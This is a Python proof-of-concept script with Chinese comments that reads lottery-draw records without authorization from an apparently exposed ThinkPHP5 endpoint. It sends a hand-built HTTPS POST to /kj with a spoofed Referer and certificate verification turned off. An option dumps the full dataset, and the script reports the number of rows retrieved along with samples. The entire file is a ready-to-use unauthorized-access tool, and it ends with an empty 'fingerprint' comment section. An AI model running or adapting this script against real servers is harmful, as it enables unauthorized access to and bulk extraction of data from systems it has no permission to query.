#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkPHP5 未授权开奖数据接口读取验证。
用法: python3 tp5_kj_unauth.py <host> <port> [g] [s]
"""
import json
import socket
import ssl
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "203.0.113.60"
PORT = int(sys.argv[2] if len(sys.argv) > 2 else 20248)
G = sys.argv[3] if len(sys.argv) > 3 else "am"      # am=澳门 tw=台湾
S = int(sys.argv[4] if len(sys.argv) > 4 else 500)  # 条数，99999 取全量

body = json.dumps({"g": G, "s": S})
s = socket.create_connection((HOST, PORT), timeout=15)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
s = ctx.wrap_socket(s, server_hostname=HOST)
req = (f"POST /kj HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
       f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
       f"Referer: https://{HOST}:{PORT}/jilu/\r\nConnection: close\r\n\r\n{body}")
s.sendall(req.encode())
data = b""
while len(data) < 2_000_000:
    c = s.recv(65536)
    if not c:
        break
    data += c
s.close()
b = data.split(b"\r\n\r\n", 1)[1]
j = json.loads(b[b.find(b"{"):b.rfind(b"}") + 1])
rows = j.get("data") or []
print(f"[+] 未授权读取成功: {len(rows)} 条")
for r in rows[:3]:
    print("   ", r.get("date"), r.get("qishu"), r.get("num"))

# 指纹确认（框架识别）
